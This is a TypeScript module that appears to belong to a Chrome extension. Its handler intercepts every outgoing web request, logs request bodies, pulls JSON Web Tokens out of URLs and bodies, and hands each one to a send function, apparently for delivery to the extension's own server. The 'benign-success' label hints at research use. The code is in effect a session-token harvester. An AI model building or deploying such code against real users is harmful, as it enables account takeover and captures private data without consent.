import { save, send, ourURL } from './utilities'
import { findJWT } from './jwt'
import type { JWT, JWTMessage } from './jwt'

const enc = new TextDecoder('utf-8')

const processRequest = (
  req: chrome.webRequest.WebRequestBodyDetails,
  match: JWT
) => {
  const data: JWTMessage = {
    jwt: match,
    url: req.url,
    type: 'R',
    name: req.type,
  }
  console.log('JWT FOUND', data)
  save(data, 'benign-success')
  send(data)
}

// TODO: check if decodedData actually needs decodingURIComponents applied
const decodeRaw = (raw: chrome.webRequest.UploadData[]) => {
  const decodedData = raw.map((data) => {
    return enc.decode(data.bytes)
  })
  return decodeURIComponent(decodedData.join(''))
}

const onBeforeRequestHandler = (
  req: chrome.webRequest.WebRequestBodyDetails
) => {
  if (ourURL(req.url)) {
    return
  }
  const urlMatches = findJWT(req.url)
  for (const match of urlMatches) {
    console.info('url might have a JWT', req.url)
    processRequest(req, match)
  }
  if (req.requestBody?.formData) {
    console.log(
      'form data found',
      req.url,
      ' formData: ',
      req.requestBody.formData
    )
  }
  if (req.requestBody?.raw) {
    const body = decodeRaw(req.requestBody.raw)
    console.log(req.url, 'body: ', body)
    const rawMatches = findJWT(body)
    for (const match of rawMatches) {
      processRequest(req, match)
    }
  }
}

export default onBeforeRequestHandler
